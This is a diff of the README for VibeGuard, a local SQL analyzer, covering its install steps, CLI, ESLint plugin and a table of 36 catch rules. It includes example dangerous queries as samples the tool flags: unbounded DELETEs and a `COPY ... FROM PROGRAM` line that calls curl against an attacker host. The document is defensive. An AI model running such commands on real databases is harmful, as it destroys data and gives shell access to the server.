@@ -5,22 +5,27 @@
 
 [![@vibeguard-dev/local](https://img.shields.io/npm/v/@vibeguard-dev/local?label=%40vibeguard-dev%2Flocal)](https://www.npmjs.com/package/@vibeguard-dev/local)
 [![eslint-plugin-vibeguard](https://img.shields.io/npm/v/eslint-plugin-vibeguard?label=eslint-plugin-vibeguard)](https://www.npmjs.com/package/eslint-plugin-vibeguard)
-[![@vibeguard-dev/ui](https://img.shields.io/npm/v/@vibeguard-dev/ui?label=%40vibeguard-dev%2Fui)](https://www.npmjs.com/package/@vibeguard-dev/ui)
 [![License](https://img.shields.io/badge/license-Apache%202.0-blue)](./LICENSE)
 [![CI](https://github.com/MuddySheep/vibeguard-local/actions/workflows/ci.yml/badge.svg)](https://github.com/MuddySheep/vibeguard-local/actions/workflows/ci.yml)
 [![Playground](https://github.com/MuddySheep/vibeguard-local/actions/workflows/playground-deploy.yml/badge.svg)](https://muddysheep.github.io/vibeguard-local/)
 
 ---
 
+## What it does
+
+You write SQL — by hand, by template literal, or by AI agent. Before that SQL touches your database, VibeGuard reads it and flags 36 patterns that destroy data, leak data, or create security holes. The check runs locally in milliseconds. Nothing leaves your machine. There's a browser playground, a CLI for `.sql` files and CI, an ESLint plugin for `` sql`...` `` template literals, and a programmatic SDK if you want to wire it into something custom.
+
+---
+
 ## Who this is for
 
-If you're in any of these three situations, this is for you:
+Three situations. If any apply, this is for you:
 
-- **You write SQL by hand** — migrations, RPC bodies, ad-hoc fixes. One missing `WHERE` clause can wipe a table at 11pm and you spend Saturday restoring from backup.
-- **You use generated SQL** — Drizzle, Prisma, raw `` sql`...` `` template literals. Most of it is safe; the dangerous queries are the ones you wrote yourself in a tagged template and never linted.
-- **You let AI agents touch your database** — Cursor, Claude Code, Replit Agent, custom orchestrators. The agent confidently generates a `DELETE FROM users` and you find out it ran when the support tickets start.
+- **You write SQL by hand.** Migrations, RPC bodies, ad-hoc fixes. One missing `WHERE` clause wipes a table at 11pm and you spend Saturday restoring from backup.
+- **You write SQL inside JavaScript or TypeScript.** Tagged template literals (`` sql`SELECT ...` ``) in postgres.js, Kysely, Drizzle's raw SQL escape, or any framework. Most ORM code is safe; the dangerous queries are the ones you wrote yourself in a tagged template and never linted.
+- **You let AI agents touch your database.** Cursor, Claude Code, Replit Agent, custom orchestrators. The agent confidently generates `DELETE FROM users` and you find out it ran when the support tickets start.
 
-If your entire workflow is structured query builders you never override (`.from().select().eq()` chains, ActiveRecord without `find_by_sql`), this isn't for you — those are already parameterized and safe by construction. **The moment SQL gets written — by you, by your team, or by an AI — that's when this kicks in.**
+If your entire workflow is structured query builders you never override (`.from().select().eq()` chains, ActiveRecord without `find_by_sql`), this isn't for you — those are already parameterized and safe by construction. The moment SQL gets written as text, by anyone or anything, that's when this kicks in.
 
 ---
 
@@ -34,7 +39,7 @@ Paste any SQL query, see what gets caught. Or click one of 36 ready-made samples
 
 ## Three queries that look fine and aren't
 
-Real shapes that have caused real outages. Paste any of these into the playground and watch what happens.
+These are real query shapes that have caused real outages. Paste any of them into the playground and watch what happens.
 
 ### 1. The "audit log makes it look bounded" trick
 
@@ -48,8 +53,8 @@ SELECT id, 'purged' FROM deleted_users
 WHERE account_status = 0;
 ```
 
-**Looks like:** we only purge inactive users — there's a `WHERE account_status = 0` right there.
-**Actually does:** deletes every row in `users`. The `WHERE` is on the outer `SELECT`, not the `DELETE`. The audit log just *looks* clean.
+**What it looks like:** we only purge inactive users — there's a `WHERE account_status = 0` right there.
+**What it actually does:** deletes every row in `users`. The `WHERE` is on the outer `SELECT`, not the `DELETE`. The audit log just *looks* clean because only the inactive users get logged.
 **VibeGuard catches:** `SQL-003 (block, 97) — Unbounded DELETE statement.`
 
 ### 2. The `WHERE 1=1` placeholder that ships to production
@@ -58,8 +63,8 @@ WHERE account_status = 0;
 DELETE FROM users WHERE 1=1;
 ```
 
-**Looks like:** scoped — there's a `WHERE` clause.
-**Actually does:** deletes everything. AI agents leave `WHERE 1=1` as a placeholder they "intend to fill in." Sometimes they don't.
+**What it looks like:** scoped — there's a `WHERE` clause.
+**What it actually does:** deletes everything. AI agents leave `WHERE 1=1` as a placeholder they "intend to fill in later." Sometimes they don't.
 **VibeGuard catches:** `SQL-034 (block, 95) — literal tautology on DELETE.`
 
 ### 3. The Postgres feature that's also remote code execution
@@ -68,21 +73,37 @@ DELETE FROM users WHERE 1=1;
 COPY users FROM PROGRAM 'curl http://attacker.com/payload.csv';
 ```
 
-**Looks like:** a normal `COPY` for loading data.
-**Actually does:** runs `curl` (or any shell command) on the database server. If an AI agent has DB credentials and writes this, it's RCE on your Postgres host. This is documented Postgres behavior, not a vulnerability — and most people don't know it exists.
+**What it looks like:** a normal `COPY` for loading data.
+**What it actually does:** runs `curl` (or any shell command) on the database server. If an AI agent has DB credentials and writes this, that's RCE on your Postgres host. This is documented Postgres behavior, not a vulnerability — and most people don't know it exists.
 **VibeGuard catches:** `SQL-016 (block, 99) — COPY ... FROM PROGRAM.`
 
-There are 33 more like these. Full list is below.
+There are 33 more like these. The full list is below.
 
 ---
 
 ## Install
 
-### `@vibeguard-dev/local` — the SDK + CLI
+There are two packages. Pick based on where your SQL lives:
+
+| Where your SQL lives | Install |
+|---|---|
+| `.sql` files (migrations, RPC bodies, ad-hoc) | **`@vibeguard-dev/local`** — the SDK and CLI |
+| Inside JS/TS files as `` sql`...` `` template literals | **`eslint-plugin-vibeguard`** (which uses the SDK under the hood) |
+| Both | Install both |
+
+Most people start with `@vibeguard-dev/local`, run the CLI on their migrations, see what it catches, then add the ESLint plugin if they also have SQL inside template literals.
+
+### `@vibeguard-dev/local` — the SDK and CLI
+
+The engine. The SDK is what does the analysis; the CLI is the same engine wrapped for terminal use. Install this if you have `.sql` files anywhere or want to use the analyzer programmatically.
 
 ```bash
 npm install @vibeguard-dev/local libpg-query
 ```
+
+`libpg-query` is the Postgres parser. It's a peer dependency because some users want to control its version separately.
+
+**Programmatic use:**
 
 ```ts
 import { analyze, init } from '@vibeguard-dev/local';
@@ -93,18 +114,24 @@ const result = analyze(`UPDATE users SET email = 'x@y.com'`);
 //   → { catches: [{ code: 'SQL-003', severity: 'block', confidence: 99, … }] }
 ```
 
-CLI:
+`analyze()` takes a SQL string and returns an array of catches. Each catch has a stable code, a severity (`block` | `warn` | `info`), a confidence number, a human-readable message, and a suggested fix. That's the whole API.
+
+**CLI use** (best for `.sql` files and CI):
 
 ```bash
-npx @vibeguard-dev/local init                 # scaffold a sample + lint:sql script
-vg-local analyze 'src/**/*.sql'               # CI-friendly; exits 1 on any block-severity catch
+npx @vibeguard-dev/local init                 # scaffold a sample SQL file + npm script
+vg-local analyze 'src/**/*.sql'               # analyze files; exit code 1 on any block-severity catch
 vg-local analyze 'src/**/*.sql' --fix         # apply autofixes for SQL-001 / 005 / 006 / 011
-vg-local analyze 'src/**/*.sql' --fix-dry-run # print a diff without writing
+vg-local analyze 'src/**/*.sql' --fix-dry-run # show what would change, don't write
 ```
+
+The exit-code-1-on-block behavior is what makes it CI-friendly: drop `vg-local analyze` into a GitHub Action, and PRs that introduce a block-severity catch fail the build.
 
 Full SDK and CLI reference: [`packages/sdk/README.md`](./packages/sdk/README.md).
 
-### `eslint-plugin-vibeguard` — in-editor catches on `` sql`...` ``
+### `eslint-plugin-vibeguard` — for SQL inside JS/TS template literals
+
+If your SQL lives in `` sql`SELECT ...` `` tagged template literals, this gets you in-editor underlines as you type — same way ESLint flags any other lint error. Install on top of (or alongside) `@vibeguard-dev/local`.
 
 ```bash
 npm install --save-dev eslint-plugin-vibeguard libpg-query
@@ -123,34 +150,23 @@ export default [
 ];
 ```
 
-Now `` sql`SELECT id FROM users WHERE active = NULL` `` underlines `active = NULL` in your editor. `--fix` rewrites it to `IS NULL`, like Prettier.
+Now `` sql`SELECT id FROM users WHERE active = NULL` `` underlines `active = NULL` in your editor with the SQL-005 catch. Run `eslint --fix` and it rewrites to `IS NULL`, the same way Prettier reformats code.
+
+The plugin recognizes the `sql` tag by default. You can configure other tags (e.g. `db.query`) — see the plugin docs.
 
 Full plugin docs: [`packages/eslint-plugin/README.md`](./packages/eslint-plugin/README.md).
-
-### `@vibeguard-dev/ui` — the design system the playground uses
-
-```bash
-npm install @vibeguard-dev/ui react react-dom
-```
-
-```ts
-import '@vibeguard-dev/ui/tokens.css';
-import '@vibeguard-dev/ui/styles.css';
-import { CatchCard, ThemeToggle, Mesh } from '@vibeguard-dev/ui';
-```
-
-Tokens (dark + light), `CatchCard`, `SeverityBadge`, `CodeBlock`, `Nav`, `ThemeToggle`, `Mesh` / `Grain` atmosphere primitives. Pre-1.0 — internal-API breakage between minor versions is allowed while the surface settles. Full inventory: [`packages/ui/README.md`](./packages/ui/README.md).
 
 ---
 
 ## What's in the playground
 
-- **36 catch-keyed samples** — one preset per shipped rule (`SQL-001` through `SQL-036`). Click `SQL-013` to see a `DROP TABLE` get blocked. Click `SQL-005` for a `WHERE col = NULL` footgun. Click `SQL-034` for the `WHERE 1=1` tautology trap. The `SQL-014` chip auto-enables the default-OFF "missing RETURNING" rule for that sample.
-- **Paste your own SQL** — re-analyzes on every keystroke. CodeMirror 6, Postgres syntax highlighting, line numbers.
-- **AST view** — see what the parser actually saw. Useful when a catch surprises you.
-- **Share via URL** — gzip + base64-encodes the editor contents into the URL hash. No backend, no tracking.
-- **Dark / light theme** — persisted in `localStorage`.
-- **Responsive** — works on phones; editor and results panel stack on narrow viewports.
+The playground at [muddysheep.github.io/vibeguard-local](https://muddysheep.github.io/vibeguard-local/) is a hosted demo of the analyzer running entirely in your browser. Useful for:
+
+- **Trying it before installing.** Paste a query, see what fires, decide if it's worth the `npm install`.
+- **Sharing a finding.** The `share` button packs the editor contents into the URL. Copy the URL, paste it in Slack, your teammate sees the same query and the same verdict.
+- **Reproducing a bug.** If the analyzer surprises you, the AST view shows what the parser actually saw, which is usually where the surprise came from.
+
+All 36 catches have a one-click sample in the gallery. Clicking `SQL-013` loads a `DROP TABLE` example; `SQL-005` loads a `WHERE col = NULL` footgun; and so on. Use the samples to map a catch ID to a real query in seconds.
 
 | Light theme | AST viewer |
 |---|---|
@@ -160,9 +176,9 @@ Tokens (dark + light), `CatchCard`, `SeverityBadge`, `CodeBlock`, `Nav`, `ThemeT
 
 ## The 36 catches
 
-Each has a stable code (e.g. `SQL-001`), a severity, a confidence range, and a docs page. **Catch IDs are forever-stable** — once published, an ID always means the same thing (see [`STABILITY.md`](./packages/sdk/STABILITY.md)).
+Each has a stable code (e.g. `SQL-001`), a severity, a confidence range, and a docs page. **Catch IDs are forever-stable** — once a catch ID is published, it always means the same thing. Severity may change in major versions; the *meaning* of the ID does not. (Full stability commitment: [`STABILITY.md`](./packages/sdk/STABILITY.md).)
 
-V1.0–V1.5 shipped 15 catches focused on correctness footguns (cartesian, NULL comparison, missing WHERE). V1.6 adds 21 Postgres-specific catches focused on **destruction, exfiltration, privilege escalation, and analyzer blind spots** (`SQL-016` through `SQL-036`).
+V1.0 through V1.5 shipped 15 catches focused on **correctness footguns** — cartesian products, NULL comparison bugs, missing WHERE clauses, recursive CTE termination. V1.6 adds 21 Postgres-specific catches focused on **destruction, exfiltration, privilege escalation, and analyzer blind spots** (`SQL-016` through `SQL-036`).
 
 | Code | Title | Severity | Confidence | Default | Auto-fix |
 |---|---|---|---|---|---|
@@ -203,6 +219,17 @@ V1.0–V1.5 shipped 15 catches focused on correctness footguns (cartesian, NULL 
 | [`SQL-035`](./packages/sdk/docs/rules/sql-035.md) | `UPDATE … FROM` without join predicate (cross-join overwrite) | block | 90 | ON | — |
 | [`SQL-036`](./packages/sdk/docs/rules/sql-036.md) | `DELETE … USING` without join predicate (cross-join wipe) | block | 90 | ON | — |
 
+**Severity meanings:**
+- **block** — fails CI, errors in the editor, refuses the autofix flow without explicit override. Used for shapes that almost always cause real harm.
+- **warn** — flagged but doesn't fail CI by default. Used for shapes that are usually wrong but have legitimate uses.
+- **info** — informational. Useful for review, never fails anything.
+
+**Confidence** is a number from 0 to 99 indicating how sure the analyzer is that this is a real problem and not a false positive. Higher numbers mean more confident.
+
+**Default** is whether the rule is on out of the box. Most are. `SQL-014` is off by default because most teams don't actually need RETURNING on every write, and turning it on by default would create noise.
+
+**Auto-fix** indicates whether `--fix` rewrites the SQL automatically (`yes`), inserts a placeholder for you to fill in (`placeholder`), or doesn't apply (`—`).
+
 ---
 
 ## What this is NOT
@@ -215,7 +242,7 @@ This is **static analysis only**. It checks the *shape* of the SQL text. It does
 - offer human-in-the-loop escalation for grey-zone queries
 - track per-agent behavioral baselines over time
 
-For those, there's a **VibeGuard Cloud** product — the wire-protocol proxy and MCP server this repo is the static-analysis layer of. Different product, different scope. The two are designed to work together: the OSS in your editor and CI, the Cloud between your agents and your production database.
+For those things, there's a **VibeGuard Cloud** product — the wire-protocol proxy and MCP server this repo is the static-analysis layer of. Different product, different scope. The two are designed to work together: the OSS in your editor and CI, the Cloud between your agents and your production database. This repo isn't a marketing surface for the Cloud product, but if you're wondering whether that gap exists, it does, and Cloud is what fills it.
 
 ---
 
@@ -225,28 +252,33 @@ VibeGuard parses **Postgres SQL only**, via libpg-query (Postgres's own parser).
 
 Queries in MySQL, MariaDB, or SQLite dialects will fail to parse. The most common surface for this is placeholder syntax — Postgres uses `$1, $2, $3`, while MySQL/MariaDB and many ORMs use `?`. A query like `INSERT INTO t (a, b) VALUES (?, ?)` will error with `syntax error near "?,?"` rather than running the rule analysis.
 
-Multi-dialect support (MySQL, MariaDB, SQLite) is tracked in [#1](https://github.com/MuddySheep/vibeguard-local/issues/1). Not scheduled for v1.x. Most catches are dialect-agnostic in principle, so it's not impossible — it's a parser and test-surface investment that hasn't been made yet. If you want it prioritized, 👍 the issue and leave a comment with your stack.
+Multi-dialect support (MySQL, MariaDB, SQLite) is tracked in [#1](https://github.com/MuddySheep/vibeguard-local/issues/1). It's not scheduled for v1.x. Most catches are dialect-agnostic in principle, so it's not impossible — it's a parser and test-surface investment that hasn't been made yet. If you want it prioritized, 👍 the issue and leave a comment with your stack — that signal genuinely shapes the roadmap.
 
 ---
 
 ## Repo layout
+
+This repo is a [pnpm workspace](https://pnpm.io/workspaces) with three packages and a playground app:
 vibeguard-local/
 ├── packages/
 │   ├── sdk/              # @vibeguard-dev/local — analyzer + CLI
-│   ├── eslint-plugin/    # eslint-plugin-vibeguard — sql… rule
-│   └── ui/               # @vibeguard-dev/ui — design tokens + React components
+│   ├── eslint-plugin/    # eslint-plugin-vibeguard — sql… template-literal rule
+│   └── ui/               # @vibeguard-dev/ui — design system used by the playground
 ├── apps/
-│   └── playground/       # the live web playground
+│   └── playground/       # the live web playground at muddysheep.github.io/vibeguard-local
 └── .github/workflows/
 ├── ci.yml                  # typecheck + lint + test + build + size on every push
 ├── playground-deploy.yml   # build → deploy to GitHub Pages
 └── release.yml             # creates draft GitHub Release on v* tag push
 
-[pnpm workspace](https://pnpm.io/workspaces). Use `corepack enable` to pick up the version pinned in `package.json`, then:
+`@vibeguard-dev/ui` is published to npm but isn't documented here — it's an internal-shaped package the playground happens to depend on. If you're building a custom dashboard on top of the analyzer and want the same look, see [`packages/ui/README.md`](./packages/ui/README.md). Otherwise, you can ignore it.
+
+To work on the repo locally:
 
 ```bash
+corepack enable                    # picks up the pnpm version pinned in package.json
 pnpm install
-pnpm -r --if-present build       # build first — workspace deps resolve types via dist/
+pnpm -r --if-present build         # build first — workspace deps resolve types via dist/
 pnpm -r --if-present typecheck
 pnpm -r --if-present test
 ```
